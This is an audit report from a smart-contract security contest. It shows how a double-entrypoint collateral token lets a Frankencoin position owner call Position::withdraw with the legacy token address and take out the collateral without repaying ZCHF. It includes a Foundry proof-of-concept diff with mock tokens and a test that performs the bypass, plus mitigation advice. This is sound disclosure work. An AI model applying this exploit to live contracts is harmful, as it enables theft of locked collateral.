## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- H-02

# [[H-06] Double-entrypoint collateral token allows position owner to withdraw underlying collateral without repaying ZCHF](https://github.com/code-423n4/2023-04-frankencoin-findings/issues/886) 

# Lines of code

https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L245-L255


# Vulnerability details

## Impact

`Position::withdraw` is intended to allow the position owner to withdraw any ERC20 token which might have ended up at position address. If the collateral address is passed as argument then `Position::withdrawCollateral` is called to perform the necessary checks and balances. However, this can be bypassed if the collateral token is a double-entrypoint token.

Such tokens are problematic because the legacy token delegates its logic to the new token, meaning that two separate addresses are used to interact with the same token. Previous examples include TUSD which resulted in [vulnerability when integrated into Compound](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/). This highlights the importance of carefully selecting the collateral token, especially as this type of vulnerability is not easily detectable. In addition, it is not unrealistic to expect that an upgradeable collateral token could become a double-entrypoint token in the future, e.g. USDT, so this must also be considered.

This vector involves the position owner dusting the contract with the collateral token's legacy counterpart which allows them to withdraw the full collateral balance by calling `Position::withdraw` passing the legacy address as `token` argument. This behaviour is flawed as the position owner should repay the ZCHF debt before withdrawing their underlying collateral.

## Proof of Concept

Apply the following git diff:

```diff
diff --git a/.gitmodules b/.gitmodules
index 888d42d..e80ffd8 100644
--- a/.gitmodules
+++ b/.gitmodules
@@ -1,3 +1,6 @@
 [submodule "lib/forge-std"]
 	path = lib/forge-std
 	url = https://github.com/foundry-rs/forge-std
+[submodule "lib/openzeppelin-contracts"]
+	path = lib/openzeppelin-contracts
+	url = https://github.com/openzeppelin/openzeppelin-contracts
diff --git a/lib/openzeppelin-contracts b/lib/openzeppelin-contracts
new file mode 160000
index 0000000..0a25c19
--- /dev/null
+++ b/lib/openzeppelin-contracts
@@ -0,0 +1 @@
+Subproject commit 0a25c1940ca220686588c4af3ec526f725fe2582
diff --git a/test/DoubleEntryERC20.sol b/test/DoubleEntryERC20.sol
new file mode 100644
index 0000000..b871288
--- /dev/null
+++ b/test/DoubleEntryERC20.sol
@@ -0,0 +1,74 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../lib/openzeppelin-contracts/contracts/access/Ownable.sol";
+import "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
+
+interface DelegateERC20 {
+    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
+    function delegateBalanceOf(address account) external view returns (uint256);
+}
+
+contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
+    DelegateERC20 public delegate;
+
+    constructor() {
+        _mint(msg.sender, 100 ether);
+    }
+
+    function mint(address to, uint256 amount) public onlyOwner {
+        _mint(to, amount);
+    }
+
+    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
+        delegate = newContract;
+    }
+
+    function transfer(address to, uint256 value) public override returns (bool) {
+        if (address(delegate) == address(0)) {
+            return super.transfer(to, value);
+        } else {
+            return delegate.delegateTransfer(to, value, msg.sender);
+        }
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        if (address(delegate) == address(0)) {
+            return super.balanceOf(account);
+        } else {
+            return delegate.delegateBalanceOf(account);
+        }
+    }
+}
+
+contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
+    address public delegatedFrom;
+
+    constructor(address legacyToken) {
+        delegatedFrom = legacyToken;
+        _mint(msg.sender, 100 ether);
+    }
+
+    modifier onlyDelegateFrom() {
+        require(msg.sender == delegatedFrom, "Not legacy contract");
+        _;
+    }
+
+    function mint(address to, uint256 amount) public onlyOwner {
+        _mint(to, amount);
+    }
+
+    function delegateTransfer(address to, uint256 value, address origSender)
+        public
+        override
+        onlyDelegateFrom
+        returns (bool)
+    {
+        _transfer(origSender, to, value);
+        return true;
+    }
+
+    function delegateBalanceOf(address account) public view override onlyDelegateFrom returns (uint256) {
+        return balanceOf(account);
+    }
+}
diff --git a/test/GeneralTest.t.sol b/test/GeneralTest.t.sol
index 402416d..9ce13cd 100644
--- a/test/GeneralTest.t.sol
+++ b/test/GeneralTest.t.sol
@@ -14,6 +14,7 @@ import "../contracts/MintingHub.sol";
 import "../contracts/PositionFactory.sol";
 import "../contracts/StablecoinBridge.sol";
 import "forge-std/Test.sol";
+import {LegacyToken, DoubleEntryPoint} from "./DoubleEntryERC20.sol";
 
 contract GeneralTest is Test {
 
@@ -24,6 +25,8 @@ contract GeneralTest is Test {
     TestToken col;
     IFrankencoin zchf;
 
+    LegacyToken legacy;
+    DoubleEntryPoint doubleEntry;
     User alice;
     User bob;
 
@@ -35,10 +38,41 @@ contract GeneralTest is Test {
         hub = new MintingHub(address(zchf), address(new PositionFactory()));
         zchf.suggestMinter(address(hub), 0, 0, "");
         col = new TestToken("Some Collateral", "COL", uint8(0));
+        legacy = new LegacyToken();
+        doubleEntry = new DoubleEntryPoint(address(legacy));
         alice = new User(zchf);
         bob = new User(zchf);
     }
 
+    function testPoCWithdrawDoubleEntrypoint() public {
+        alice.obtainFrankencoins(swap, 1000 ether);
+        emit log_named_uint("alice zchf balance before opening position", zchf.balanceOf(address(alice)));
+        uint256 initialAmount = 100 ether;
+        doubleEntry.mint(address(alice), initialAmount);
+        vm.startPrank(address(alice));
+        doubleEntry.approve(address(hub), initialAmount);
+        uint256 balanceBefore = zchf.balanceOf(address(alice));
+        address pos = hub.openPosition(address(doubleEntry), 100, initialAmount, 1000000 ether, 100 days, 1 days, 25000, 100 * (10 ** 36), 200000);
+        require((balanceBefore - hub.OPENING_FEE()) == zchf.balanceOf(address(alice)));
+        vm.warp(Position(pos).cooldown() + 1);
+        alice.mint(pos, initialAmount);
+        vm.stopPrank();
+        emit log_named_uint("alice zchf balance after opening position and minting", zchf.balanceOf(address(alice)));
+
+        uint256 legacyAmount = 1;
+        legacy.mint(address(alice), legacyAmount);
+        uint256 totalAmount = initialAmount + legacyAmount;
+        vm.prank(address(alice));
+        legacy.transfer(pos, legacyAmount);
+        legacy.delegateToNewContract(doubleEntry);
+
+        vm.prank(address(alice));
+        Position(pos).withdraw(address(legacy), address(alice), initialAmount);
+        emit log_named_uint("alice collateral balance after withdrawing collateral", doubleEntry.balanceOf(address(alice)));
+        emit log_named_uint("alice zchf balance after withdrawing collateral", zchf.balanceOf(address(alice)));
+        console.log("uh-oh, alice withdrew collateral without repaying zchf ://");
+    }
+
     function initPosition() public returns (address) {
         alice.obtainFrankencoins(swap, 1000 ether);
         address pos = alice.initiatePosition(col, hub);
```

## Tools Used

- Manual review
- Foundry

## Recommended Mitigation

- Validate the collateral balance has not changed after the token transfer within the call to `Position::withdraw`.
- Otherwise, consider restricting the use of `Position::withdraw` or remove it altogether.
